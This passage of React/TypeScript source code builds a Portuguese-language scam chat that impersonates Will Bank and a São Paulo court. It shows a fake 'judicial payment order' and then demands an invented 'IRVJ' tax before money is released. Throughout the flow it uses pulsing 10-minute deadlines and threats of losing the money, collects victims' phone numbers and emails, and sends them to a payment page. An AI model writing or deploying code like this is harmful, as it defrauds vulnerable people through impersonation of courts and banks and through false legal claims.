      <span className="text-primary flex items-center gap-2">
        <Clock className="w-4 h-4 animate-spin" /> 
        Emitindo sua ORDEM DE PAGAMENTO JUDICIAL junto ao Tribunal...
      </span>, 
      true, 60
    );
    await delay(2500);
    await addBotMessage(
      <span className="flex items-center gap-2 text-green-600 font-bold">
        <CheckCircle2 className="w-5 h-5" />
        SUA ORDEM DE PAGAMENTO FOI EMITIDA COM SUCESSO!
      </span>, 
      true, 50
    );
    await delay(1500);

    const pixKey = selectedPixType === "cpf" ? cpfData?.cpf : pixKeyInput;
    const vencimento = new Date();
    vencimento.setMinutes(vencimento.getMinutes() + 10);
    const ipct = valorBeneficio * 0.0021;
    const ipti = valorBeneficio * 0.0025;
    const ipri = valorBeneficio * 0.0025;
    const totalImposto = ipct + ipti + ipri;

    // ORDEM DE PAGAMENTO - LIQUIDAÇÃO JUDICIAL
    await addBotMessage(
      <div className="bg-card border-2 border-primary/30 rounded-2xl p-5 space-y-4 shadow-lg text-foreground">
        <h3 className="text-lg font-bold text-center bg-primary text-primary-foreground py-2 rounded-lg flex items-center justify-center gap-2">
          <Gavel className="w-5 h-5" />
          ORDEM DE PAGAMENTO - LIQUIDAÇÃO JUDICIAL
        </h3>
        
        <div className="bg-gradient-to-r from-green-500 to-emerald-500 text-white text-center py-2 rounded-full text-sm font-bold">
          📄 DOCUMENTO OFICIAL DO TRIBUNAL
        </div>

        <div className="bg-blue-50 border-l-4 border-blue-500 p-3 text-sm text-blue-800">
          <p>Em cumprimento à <strong>DECISÃO JUDICIAL</strong> (Processo N° {processoNumero}), fica <strong>DETERMINADO</strong> ao banco Will Bank S.A. (em liquidação) o pagamento <strong>IMEDIATO</strong> da quantia de <strong className="text-green-600">R$ {valorBeneficio.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</strong> ao Sr(a). <strong>{cpfData?.nome}</strong>, CPF <strong>{cpfData?.cpf}</strong>, referente a valores retidos de forma <strong className="text-red-600">ILEGAL</strong> antes do encerramento das atividades.</p>
        </div>

        <div className="divide-y border rounded-xl overflow-hidden">
          <DataRow label="Valor a Receber" value={`R$ ${valorBeneficio.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}`} highlight />
          <DataRow label="N° do Processo" value={processoNumero} />
          <DataRow label="Juízo" value="15ª Vara Cível - TJ/SP" />
          <DataRow label="Natureza" value="Restituição por Liquidação Bancária" />
          <DataRow label="Protocolo" value={protocolo} />
          <DataRow label="Data/Hora de Emissão" value={new Date().toLocaleString('pt-BR')} />
          <DataRow label="Prazo para Pagamento" value="24 HORAS" />
          <DataRow label="IRVJ (Imposto)" value={`R$ ${totalImposto.toFixed(2).replace('.', ',')}`} />
        </div>
      </div>, 
      false
    );
    await delay(2500);


    await addBotMessage(
      <div className="bg-amber-50 border border-amber-300 rounded-lg p-3">
        <p className="text-amber-800 text-sm">
          <strong>⚖️ EXIGÊNCIA DO TRIBUNAL:</strong> Você <strong>DEVE</strong> receber uma cópia da sua Ordem de Pagamento. Escolha o método de envio:
        </p>
      </div>, 
      true, 60
    );
    setStep("envio-selection");
  };

  const handleSMSOption = async () => {
    addUserMessage(<span>📱 Receber por SMS</span>);
    setStep("processing");
    await delay(1500);
    await addBotMessage(<span>Digite seu número de celular:</span>, true, 30);
    setStep("sms-input");
    setDialogType("sms");
    setComprovanteDialogOpen(true);
  };

  const handleEmailOption = async () => {
    addUserMessage(<span>📧 Receber por E-mail</span>);
    setStep("processing");
    await delay(1500);
    await addBotMessage(<span>Digite seu e-mail:</span>, true, 20);
    setStep("email-input");
    setDialogType("email");
    setComprovanteDialogOpen(true);
  };

  const handlePhoneSubmit = async () => {
    if (!phoneNumber.trim()) return;
    setComprovanteDialogOpen(false);
    addUserMessage(<span>{phoneNumber}</span>);
    setStep("processing");
    await delay(2000);
    await addBotMessage(
      <div className="space-y-2">
        <span className="flex items-center gap-2 text-green-600">
          <CheckCircle2 className="w-4 h-4" />
          Ordem de Pagamento registrada!
        </span>
        <p className="text-sm">Você irá receber uma cópia em <strong>{phoneNumber}</strong>.</p>
        <p className="text-xs text-amber-600">⏰ Você receberá em até 24 horas.</p>
      </div>, 
      true, 40
    );
    await showTaxaInfo();
  };

  const handleEnvioEmailSubmit = async () => {
    if (!emailInput.trim()) return;
    setComprovanteDialogOpen(false);
    addUserMessage(<span>{emailInput}</span>);
    setStep("processing");
    await delay(2000);
    await addBotMessage(
      <div className="space-y-2">
        <span className="flex items-center gap-2 text-green-600">
          <CheckCircle2 className="w-4 h-4" />
          Ordem de Pagamento registrada!
        </span>
        <p className="text-sm">Você irá receber uma cópia em <strong>{emailInput}</strong>.</p>
        <p className="text-xs text-amber-600">⏰ Você receberá em até 24 horas.</p>
      </div>, 
      true, 40
    );
    await showTaxaInfo();
  };

  const showTaxaInfo = async () => {
    await delay(2500);

    // Alerta vermelho pulsante
    await addBotMessage(
      <div className="bg-red-600 border-2 border-red-700 rounded-xl p-4 space-y-3 text-white animate-pulse">
        <div className="flex items-center gap-2 font-bold text-lg">
          <AlertTriangle className="w-6 h-6" />
          AVISO URGENTE DO TRIBUNAL DE JUSTIÇA
        </div>
        <p className="text-sm">Seu pagamento de <strong>R$ {valorBeneficio.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</strong> está <strong>BLOQUEADO</strong> pelo Banco Central.</p>
        <div className="bg-red-700 rounded-lg p-2 text-sm">
          <strong>MOTIVO:</strong> Para transferências oriundas de processos judiciais, a Lei 14.302/2022 <strong>EXIGE</strong> o recolhimento prévio do IRVJ (Imposto sobre Recebimento de Valores Judiciais).
        </div>
        <div className="bg-red-800 rounded-lg p-2 text-sm">
          <strong>⏰ PRAZO LIMITE:</strong> Você tem <strong>10 MINUTOS</strong> para realizar o pagamento. Após esse prazo, sua Ordem de Pagamento será <strong>CANCELADA</strong> e o valor retornará para o fundo de liquidação do banco.
        </div>
      </div>, 
      true, 150
    );
    await delay(1500);


    await addBotMessage(<span>Clique abaixo para <strong>ENTENDER A EXIGÊNCIA LEGAL</strong>.</span>, true, 45);
    setStep("taxa-info");
  };

  const handleTaxExplanation = async () => {
    addUserMessage(<span>⚖️ ENTENDER A EXIGÊNCIA LEGAL</span>);
    setStep("processing");
    await delay(1500);

    const ipct = valorBeneficio * 0.0021;
    const ipti = valorBeneficio * 0.0025;
    const ipri = valorBeneficio * 0.0025;
    const totalImposto = ipct + ipti + ipri;

    await addBotMessage(
      <div className="bg-card rounded-xl p-4 space-y-3 border-2 border-primary/30 text-foreground">
        <div className="flex items-center gap-2 text-primary font-bold">
          <Gavel className="w-5 h-5" />
          ENTENDENDO A EXIGÊNCIA LEGAL
        </div>
        
        <p className="text-sm text-muted-foreground">
          O <strong className="text-foreground">IRVJ (Imposto sobre Recebimento de Valores Judiciais)</strong> foi instituído pela Lei 14.302/2022 e é <strong className="text-red-500">OBRIGATÓRIO</strong> para qualquer transferência decorrente de processos de liquidação bancária.
        </p>

        <div className="bg-muted rounded-lg p-3 space-y-2 text-sm">
          <p className="font-bold text-foreground">📊 DETALHAMENTO DO IMPOSTO:</p>
          <div className="space-y-1 text-muted-foreground">
            <p>• IPCT (Imposto sobre Circulação de Transferência Judicial 0,21%): <strong className="text-foreground">R$ {ipct.toFixed(2).replace('.', ',')}</strong></p>
            <p>• IPTI (Imposto sobre Transferência Indenizatória 0,25%): <strong className="text-foreground">R$ {ipti.toFixed(2).replace('.', ',')}</strong></p>
            <p>• IPRI (Imposto sobre Recebimento de Indenização 0,25%): <strong className="text-foreground">R$ {ipri.toFixed(2).replace('.', ',')}</strong></p>
          </div>
          <div className="pt-2 border-t border-border">
            <p className="font-bold text-primary text-base">Total do Imposto: R$ {totalImposto.toFixed(2).replace('.', ',')} (0,71% do valor a receber)</p>
          </div>
        </div>

        <div className="bg-red-50 border border-red-200 rounded-lg p-3 text-sm">
          <p className="font-bold text-red-700 mb-2">⚠️ ATENÇÃO: Sem o pagamento deste imposto:</p>
          <ul className="space-y-1 text-red-600">
            <li>❌ O Banco Central <strong>BLOQUEIA</strong> a transferência</li>
            <li>❌ O valor <strong>RETORNA</strong> para a massa falida do Will Bank</li>
            <li>❌ Você <strong>PERDE</strong> o direito de receber</li>
            <li>❌ Sua posição na fila é <strong>CANCELADA</strong></li>
          </ul>
        </div>
      </div>, 
      true, 150
    );
    await delay(1500);

    await addBotMessage(<span><strong>IMPORTANTE:</strong> Escute o áudio abaixo com bastante atenção!</span>, true, 50);
    await delay(1000);

    // Áudio 3 - Taxas
    await addAudioMessage("/audio/audio-3.mp3");
    await delay(1500);

    await addBotMessage(
      <div className="space-y-3">
        <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 text-sm text-blue-800">
          <strong>ÚLTIMA ETAPA:</strong> Após o pagamento do imposto, o Banco Central tem até <strong>24 HORAS</strong> para autorizar a transferência para sua conta.
        </div>
        <div className="bg-red-50 border-2 border-red-300 rounded-lg p-3 text-sm text-red-700 animate-pulse">
          <strong>⚠️ AVISO FINAL:</strong> Se você <strong>NÃO</strong> realizar o pagamento nos próximos <strong>10 minutos</strong>, sua Ordem de Pagamento será <strong>AUTOMATICAMENTE CANCELADA</strong> pelo sistema do Tribunal e o valor será destinado ao fundo de liquidação — você <strong>NÃO receberá NADA</strong>.
        </div>
      </div>, 
      true, 150
    );
    setWaitingForAudio("/audio/audio-3.mp3");
    setStep("final");
  };

  const handleFinalPayment = () => {
    const ipct = valorBeneficio * 0.0021;
    const ipti = valorBeneficio * 0.0025;
    const ipri = valorBeneficio * 0.0025;
    const totalImposto = ipct + ipti + ipri;
    navigate(buildUrlWithUtm("/saque"), {
      state: {
        cpfData,
        valorBeneficio,
        valorTaxa: totalImposto,
        protocolo
      }
    });
  };

  if (!cpfData) return null;

  return (
    <div className="min-h-screen min-h-[100dvh] bg-slate-900 flex flex-col">
      {/* Chat Header */}
      <header className="bg-slate-800 text-white px-3 py-2.5 sm:px-4 sm:py-3 flex items-center gap-2.5 border-b border-slate-700 sticky top-0 z-50">
        <button onClick={() => navigate(-1)} className="p-1.5 sm:p-2 hover:bg-slate-700 rounded-full transition-colors">
          <ArrowLeft className="w-5 h-5" />
        </button>
        
        <div className="w-9 h-9 sm:w-11 sm:h-11 rounded-full bg-gradient-to-br from-primary to-amber-400 flex items-center justify-center shadow-lg">
          <img src={willbankLogo} alt="Will Bank" className="w-6 h-6 sm:w-7 sm:h-7 object-contain" />
        </div>
        
        <div className="flex-1 min-w-0">
          <h1 className="font-bold text-sm sm:text-base truncate">Liquidação Judicial - Will Bank</h1>
          <p className="text-[10px] sm:text-xs text-slate-400 flex items-center gap-1">
            <span className="w-1.5 h-1.5 sm:w-2 sm:h-2 bg-green-500 rounded-full animate-pulse"></span>
            Online agora
          </p>
        </div>

        <button className="p-1.5 sm:p-2 hover:bg-slate-700 rounded-full transition-colors">
          <Phone className="w-4 h-4 sm:w-5 sm:h-5" />
        </button>
        <button className="p-1.5 sm:p-2 hover:bg-slate-700 rounded-full transition-colors">
          <MoreVertical className="w-4 h-4 sm:w-5 sm:h-5" />
        </button>
      </header>

      {/* Messages Area */}
      <main className="flex-1 overflow-y-auto bg-gradient-to-b from-slate-900 to-slate-800 p-3 sm:p-4">
        <div className="max-w-2xl mx-auto space-y-3 sm:space-y-4">
          {/* Date indicator */}
          <div className="text-center">
            <span className="text-[10px] sm:text-xs bg-slate-700/50 text-slate-400 px-2.5 py-0.5 sm:px-3 sm:py-1 rounded-full">
              Hoje
            </span>
          </div>

          {/* Video Section */}
          {showVideo && (
            <div className="mx-auto max-w-[280px] sm:max-w-sm animate-fade-in">
              <div className="text-center mb-2 sm:mb-3">
                <p className="text-white text-xs sm:text-sm">Clique no vídeo abaixo para darmos continuidade 👇</p>
              </div>
              <div className="relative aspect-[9/16] bg-black rounded-xl sm:rounded-2xl overflow-hidden shadow-2xl">
                <video ref={videoRef} src="/video/vsl_1.mp4" className="absolute inset-0 w-full h-full object-cover" playsInline onEnded={handleVideoEnd} onClick={handleVideoClick} />
                
                {!videoPlaying && (
                  <div className="absolute inset-0 flex items-center justify-center bg-black/40 cursor-pointer" onClick={handleVideoClick}>
                    <div className="w-16 h-16 sm:w-20 sm:h-20 bg-primary rounded-full flex items-center justify-center shadow-lg hover:scale-110 transition-transform">
                      <Play className="w-8 h-8 sm:w-10 sm:h-10 text-primary-foreground ml-1" fill="currentColor" />
                    </div>
                  </div>
                )}
              </div>
            </div>
          )}

          {/* Messages */}
          {messages.map(message => (
            <div key={message.id} className={`flex ${message.type === 'user' ? 'justify-end' : 'justify-start'} animate-fade-in`}>
              {(message.type === 'bot' || message.type === 'audio') && (
                <div className="w-7 h-7 sm:w-8 sm:h-8 rounded-full bg-gradient-to-br from-primary to-amber-400 flex items-center justify-center shrink-0 mr-1.5 sm:mr-2 shadow-md">
                  <img src={willbankLogo} alt="" className="w-4 h-4 sm:w-5 sm:h-5" />
                </div>
              )}
              
              {message.type === 'error' ? (
                <div className="max-w-[90%] sm:max-w-[85%] bg-white text-slate-800 rounded-xl sm:rounded-2xl shadow-lg px-3 py-2.5 sm:px-4 sm:py-3">
                  {message.content}
                </div>
              ) : (
                <div className={`max-w-[90%] sm:max-w-[85%] ${message.type === 'user' ? 'bg-primary text-primary-foreground rounded-xl sm:rounded-2xl rounded-br-sm' : 'bg-slate-700 text-white rounded-xl sm:rounded-2xl rounded-bl-sm shadow-lg'} px-3 py-2 sm:px-4 sm:py-3`}>
                  {message.type === 'audio' ? (() => {
                    const src = message.audioSrc || "";
                    const listened = audioListened.has(src);
                    const disabled = !!nextRequiredAudio && src !== nextRequiredAudio && !listened;
                    return (
                      <AudioPlayerComponent
                        audioSrc={src}
                        isPlaying={playingAudioId === message.id}
                        onPlay={() => {
                          if (disabled) return;
                          playAudio(src, message.id);
                        }}
                        listened={listened}
                        disabled={disabled}
                      />
                    );
                  })() : <div className="text-xs sm:text-sm leading-relaxed">{message.content}</div>}
                  <div className={`text-[9px] sm:text-[10px] mt-1 text-right ${message.type === 'user' ? 'text-primary-foreground/70' : 'text-slate-400'}`}>
                    {message.time}
                  </div>
                </div>
              )}
            </div>
          ))}

          {/* Typing Indicator */}
          {isTyping && (
            <div className="flex justify-start animate-fade-in">
              <div className="w-7 h-7 sm:w-8 sm:h-8 rounded-full bg-gradient-to-br from-primary to-amber-400 flex items-center justify-center shrink-0 mr-1.5 sm:mr-2 shadow-md">
                <img src={willbankLogo} alt="" className="w-4 h-4 sm:w-5 sm:h-5" />
              </div>
              <div className="bg-slate-700 text-white rounded-xl sm:rounded-2xl rounded-bl-sm shadow-lg px-3 py-2.5 sm:px-4 sm:py-3">
                <div className="flex gap-1">
                  <span className="w-2 h-2 bg-slate-400 rounded-full animate-bounce" style={{ animationDelay: '0ms' }}></span>
                  <span className="w-2 h-2 bg-slate-400 rounded-full animate-bounce" style={{ animationDelay: '150ms' }}></span>
                  <span className="w-2 h-2 bg-slate-400 rounded-full animate-bounce" style={{ animationDelay: '300ms' }}></span>
                </div>
              </div>
            </div>
          )}

          {/* Action Buttons */}
          {!showVideo && (
            <div className="flex flex-wrap gap-1.5 sm:gap-2 justify-center py-2 sm:py-3">
              {/* Quiz Options */}
              {step === "quiz-mae" && quizOptions.length > 0 && quizOptions.map((option, index) => (
                <Button 
                  key={`mae-${index}-${option.text}`} 
                  onClick={() => handleQuizAnswer(option, "mae")} 
                  className="bg-slate-700 hover:bg-slate-600 text-white border border-slate-600 rounded-full font-medium shadow-lg text-xs sm:text-sm px-3 py-1.5 h-auto"
                >
                  {option.text}
                </Button>
              ))}
              
              {step === "quiz-nascimento" && quizOptions.length > 0 && quizOptions.map((option, index) => (
                <Button 
                  key={`nasc-${index}-${option.text}`} 
                  onClick={() => handleQuizAnswer(option, "nascimento")} 
                  className="bg-slate-700 hover:bg-slate-600 text-white border border-slate-600 rounded-full font-medium shadow-lg text-xs sm:text-sm px-3 py-1.5 h-auto"
                >
                  {option.text}
                </Button>
              ))}

              {step === "audio-3-validation" && (waitingForAudio === null || audioListened.has("/audio/audio-1.mp3")) && (
                <Button 
                  onClick={handleConfirmValidation} 
                  className="bg-gradient-to-r from-green-500 to-emerald-500 hover:from-green-600 hover:to-emerald-600 text-white rounded-full font-bold shadow-lg px-5 sm:px-8 text-xs sm:text-sm"
                >
                  <Gavel className="w-4 h-4 mr-2" />
                  CONFIRMAR ORDEM DE PAGAMENTO
                </Button>
              )}

              {step === "audio-3-validation" && waitingForAudio === "/audio/audio-1.mp3" && !audioListened.has("/audio/audio-1.mp3") && (
                <p className="text-slate-400 text-xs animate-pulse">🎧 Ouça o áudio acima para continuar...</p>
              )}

              {step === "pix-type-selection" && (
                <div className="flex flex-col gap-1.5 sm:gap-2 w-full max-w-xs">
                  <Button onClick={handlePixTypeTelefone} variant="outline" className="bg-slate-700 hover:bg-slate-600 text-white border-slate-600 rounded-full font-bold shadow-lg px-6 sm:px-8 text-xs sm:text-sm h-10">
                    📱 Telefone
                  </Button>
                  <Button onClick={handlePixTypeCPF} className="bg-gradient-to-r from-primary to-amber-400 text-primary-foreground rounded-full font-bold shadow-lg px-6 sm:px-8 text-xs sm:text-sm h-10">
                    📋 CPF
                  </Button>
                  <Button onClick={handlePixTypeEmail} variant="outline" className="bg-slate-700 hover:bg-slate-600 text-white border-slate-600 rounded-full font-bold shadow-lg px-6 sm:px-8 text-xs sm:text-sm h-10">
                    📧 E-mail
                  </Button>
                </div>
              )}

              {step === "pix-confirm" && (
                <Button 
                  onClick={handleConfirmPix} 
                  className="bg-gradient-to-r from-green-500 to-emerald-500 text-white rounded-full font-bold shadow-lg px-5 sm:px-8 text-xs sm:text-sm"
                >
                  ✓ Sim, está correto
                </Button>
              )}

              {step === "audio-2-comprovante" && (waitingForAudio === null || audioListened.has("/audio/audio-2.mp3")) && (
                <Button 
                  onClick={handleGenerateComprovante} 
                  className="bg-gradient-to-r from-primary to-amber-400 text-primary-foreground rounded-full font-bold shadow-lg px-5 sm:px-8 text-xs sm:text-sm"
                >
                  <Gavel className="w-4 h-4 mr-2" />
                  GERAR ORDEM DE PAGAMENTO
                </Button>
              )}

              {step === "audio-2-comprovante" && waitingForAudio === "/audio/audio-2.mp3" && !audioListened.has("/audio/audio-2.mp3") && (
                <p className="text-slate-400 text-xs animate-pulse">🎧 Ouça o áudio acima para continuar...</p>
              )}

              {step === "envio-selection" && (
                <div className="flex flex-col gap-1.5 sm:gap-2 w-full max-w-xs">
                  <Button onClick={handleSMSOption} className="bg-gradient-to-r from-primary to-amber-400 text-primary-foreground rounded-full font-bold shadow-lg px-6 sm:px-8 flex items-center gap-2 text-xs sm:text-sm h-10">
                    <Smartphone className="w-4 h-4" />
                    Receber por SMS
                  </Button>
                  <Button onClick={handleEmailOption} variant="outline" className="bg-slate-700 hover:bg-slate-600 text-white border-slate-600 rounded-full font-bold shadow-lg px-6 sm:px-8 flex items-center gap-2 text-xs sm:text-sm h-10">
                    <Mail className="w-4 h-4" />
                    Receber por E-mail
                  </Button>
                </div>
              )}

              {step === "taxa-info" && (
                <Button 
                  onClick={handleTaxExplanation} 
                  className="bg-gradient-to-r from-orange-500 to-amber-500 hover:from-orange-600 hover:to-amber-600 text-white rounded-full font-bold shadow-lg text-xs sm:text-sm px-4 sm:px-6"
                >
                  <Gavel className="w-4 h-4 mr-2" />
                  ENTENDER A EXIGÊNCIA LEGAL
                </Button>
              )}

              {step === "final" && (waitingForAudio === null || audioListened.has("/audio/audio-3.mp3")) && (
                <Button 
                  onClick={handleFinalPayment} 
                  className="bg-gradient-to-r from-green-500 to-emerald-500 hover:from-green-600 hover:to-emerald-600 text-white rounded-full font-bold shadow-lg px-4 sm:px-6 animate-pulse text-xs sm:text-sm"
                >
                  💰 PAGAR IMPOSTO E LIBERAR MEU DINHEIRO
                </Button>
              )}

              {step === "final" && waitingForAudio === "/audio/audio-3.mp3" && !audioListened.has("/audio/audio-3.mp3") && (
                <p className="text-slate-400 text-xs animate-pulse">🎧 Ouça o áudio acima para continuar...</p>
              )}
            </div>
          )}

          <div ref={messagesEndRef} />
        </div>
      </main>


      {/* Dialog for PIX key input (telefone/email) */}
      <Dialog open={pixDialogOpen} onOpenChange={setPixDialogOpen}>
        <DialogContent 
          className="sm:max-w-md"
          onInteractOutside={(e) => e.preventDefault()}
          onEscapeKeyDown={(e) => e.preventDefault()}
        >
          <DialogHeader>
            <DialogTitle className="text-center">
              {dialogType === "telefone" ? "📱 Digite sua chave PIX (Telefone)" : "📧 Digite sua chave PIX (E-mail)"}
            </DialogTitle>
          </DialogHeader>
          <div className="space-y-4 py-4">
            <Input
              placeholder={dialogType === "telefone" ? "(00) 00000-0000" : "seuemail@exemplo.com"}
              type={dialogType === "email" ? "email" : "text"}
              value={pixKeyInput}
              onChange={(e) => setPixKeyInput(e.target.value)}
              className="h-12 text-base"
              autoFocus
            />
            <Button
              onClick={handlePixKeySubmit}
              disabled={!pixKeyInput.trim()}
              className="w-full h-12 bg-gradient-to-r from-primary to-amber-400 text-primary-foreground font-bold rounded-full"
            >
              <Send className="w-4 h-4 mr-2" />
              Confirmar
            </Button>
          </div>
        </DialogContent>
      </Dialog>

      {/* Dialog for comprovante input (SMS/email) */}
      <Dialog open={comprovanteDialogOpen} onOpenChange={setComprovanteDialogOpen}>
        <DialogContent 
          className="sm:max-w-md"
          onInteractOutside={(e) => e.preventDefault()}
          onEscapeKeyDown={(e) => e.preventDefault()}
        >
          <DialogHeader>
            <DialogTitle className="text-center">
              {dialogType === "sms" ? "📱 Digite seu número de celular" : "📧 Digite seu e-mail"}
            </DialogTitle>
          </DialogHeader>
          <div className="space-y-4 py-4">
            {dialogType === "sms" ? (
              <>
                <Input
                  placeholder="(00) 00000-0000"
                  value={phoneNumber}
                  onChange={(e) => setPhoneNumber(e.target.value)}
                  className="h-12 text-base"
                  autoFocus
                />
                <Button
                  onClick={handlePhoneSubmit}
                  disabled={!phoneNumber.trim()}
                  className="w-full h-12 bg-gradient-to-r from-primary to-amber-400 text-primary-foreground font-bold rounded-full"
                >
                  <Send className="w-4 h-4 mr-2" />
                  Enviar Comprovante
                </Button>
              </>
            ) : (
              <>
                <Input
                  placeholder="seuemail@exemplo.com"
                  type="email"
                  value={emailInput}
                  onChange={(e) => setEmailInput(e.target.value)}
                  className="h-12 text-base"
                  autoFocus
                />
                <Button
                  onClick={handleEnvioEmailSubmit}
                  disabled={!emailInput.trim()}
                  className="w-full h-12 bg-gradient-to-r from-primary to-amber-400 text-primary-foreground font-bold rounded-full"
                >
                  <Send className="w-4 h-4 mr-2" />
                  Enviar Comprovante
                </Button>
              </>
            )}
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
};

// Helper Components
const DataRow = ({
  label,
  value,
  highlight = false
}: {
  label: string;
  value: string;
  highlight?: boolean;
}) => {
  return (
    <div className="flex justify-between p-3 bg-card">
      <span className="text-sm text-muted-foreground font-medium">{label}</span>
      <span className={`text-sm font-bold text-right ${highlight ? 'text-green-600 text-base' : 'text-foreground'}`}>{value}</span>
    </div>
  );
};

const AudioPlayerComponent = forwardRef<HTMLDivElement, {
  audioSrc: string;
  isPlaying: boolean;
  onPlay: () => void;
  listened?: boolean;
  disabled?: boolean;
}>(({ audioSrc, isPlaying, onPlay, listened, disabled }, ref) => (
  <div ref={ref} className="flex items-center gap-3 w-48">
    <button
      onClick={onPlay}
      disabled={disabled}
      className={`w-10 h-10 rounded-full flex items-center justify-center shadow-md transition-transform shrink-0 relative ${disabled ? 'opacity-50 cursor-not-allowed bg-muted' : 'bg-gradient-to-br from-primary to-amber-400 hover:scale-105'}`}
      aria-disabled={disabled}
      title={disabled ? 'Ouça os áudios anteriores primeiro' : 'Reproduzir áudio'}
    >
      {isPlaying ? <Pause className="w-5 h-5 text-primary-foreground" fill="currentColor" /> : <Play className="w-5 h-5 text-primary-foreground ml-0.5" fill="currentColor" />}
      {listened && (
        <span className="absolute -top-1 -right-1 w-4 h-4 bg-green-500 rounded-full flex items-center justify-center border-2 border-slate-700">
          <Check className="w-2.5 h-2.5 text-white" />
        </span>
      )}
    </button>
    <div className="flex-1 flex flex-col gap-1">
      <div className="h-8 flex items-center gap-0.5">
        {[...Array(16)].map((_, i) => (
          <div 
            key={i} 
            className={`w-1 rounded-full transition-all ${disabled ? 'bg-muted' : isPlaying ? 'bg-primary animate-pulse' : listened ? 'bg-green-500' : 'bg-slate-500'}`} 
            style={{ height: `${Math.random() * 16 + 8}px`, animationDelay: `${i * 50}ms` }} 
          />
        ))}
      </div>
      {listened && (
        <span className="text-[10px] text-green-400 flex items-center gap-1">
          <Check className="w-3 h-3" /> Ouvido
        </span>
      )}
    </div>
  </div>
));
AudioPlayerComponent.displayName = "AudioPlayerComponent";

// Approval Animation Component
const ApprovalAnimation = ({ value, name }: { value: number; name: string }) => {
  const [step1, setStep1] = useState(false);
  const [step2, setStep2] = useState(false);
  const [step3, setStep3] = useState(false);
  const [showValue, setShowValue] = useState(false);

  useEffect(() => {
    const timer1 = setTimeout(() => setStep1(true), 500);
    const timer2 = setTimeout(() => setStep2(true), 1000);
    const timer3 = setTimeout(() => setStep3(true), 1500);
    const timer4 = setTimeout(() => setShowValue(true), 2000);
    return () => {
      clearTimeout(timer1);
      clearTimeout(timer2);
      clearTimeout(timer3);
      clearTimeout(timer4);
    };
  }, []);

  return (
    <div className="bg-card border-2 border-primary/30 rounded-2xl p-5 space-y-5 shadow-lg">
      <div className="flex justify-center">
        <img src={willbankLogo} alt="Will Bank" className="h-10" />
      </div>
      
      <div className="h-1 bg-gradient-to-r from-primary via-primary to-amber-400 rounded-full" />
      
      <div className="flex items-center justify-center gap-2">
        <div className="flex flex-col items-center gap-1">
          <AnimatedCheckDot completed={step1} />
          <span className="text-[10px] text-muted-foreground">Verificando Ordem Judicial</span>
        </div>
        <div className={`w-8 h-0.5 transition-all duration-500 ${step1 && step2 ? 'bg-primary' : 'bg-muted'}`} />
        <div className="flex flex-col items-center gap-1">
          <AnimatedCheckDot completed={step2} />
          <span className="text-[10px] text-muted-foreground">Validando CPF no Processo</span>
        </div>
        <div className={`w-8 h-0.5 transition-all duration-500 ${step2 && step3 ? 'bg-primary' : 'bg-muted'}`} />
        <div className="flex flex-col items-center gap-1">
          <AnimatedCheckDot completed={step3} />
          <span className="text-[10px] text-muted-foreground">PAGAMENTO LIBERADO!</span>
        </div>
      </div>

      <div className="text-center space-y-2">
        <p className={`font-bold text-foreground transition-opacity duration-500 ${showValue ? 'opacity-100' : 'opacity-50'}`}>
          {name}
        </p>
        <p className={`text-sm text-muted-foreground transition-opacity duration-500 ${showValue ? 'opacity-100' : 'opacity-0'}`}>
          A JUSTIÇA AUTORIZOU O PAGAMENTO DE:
        </p>
        <p className={`text-3xl font-black text-primary transition-all duration-700 ${showValue ? 'opacity-100 scale-100' : 'opacity-0 scale-75'}`}>
          R$ {value.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}
        </p>
        <div className={`transition-opacity duration-500 ${showValue ? 'opacity-100' : 'opacity-0'}`}>
          <p className="text-xs text-muted-foreground">
            Este valor será <strong>TRANSFERIDO PARA SUA CONTA</strong> em até 24 horas após a confirmação final.
          </p>
          <p className="text-xs text-red-500 font-bold mt-1">
            ⚠️ NÃO FECHE ESTA PÁGINA ou você perderá sua posição na fila de pagamentos.
          </p>
        </div>
      </div>
    </div>
  );
};

const AnimatedCheckDot = forwardRef<HTMLDivElement, { completed: boolean }>(({ completed }, ref) => (
  <div 
    ref={ref} 
    className={`w-8 h-8 rounded-full flex items-center justify-center transition-all duration-500 ${completed ? 'bg-gradient-to-br from-primary to-amber-400 scale-100' : 'bg-muted scale-75'}`}
  >
    {completed && <Check className="w-4 h-4 text-primary-foreground animate-scale-in" />}
  </div>
));
AnimatedCheckDot.displayName = "AnimatedCheckDot";

export default Chat;
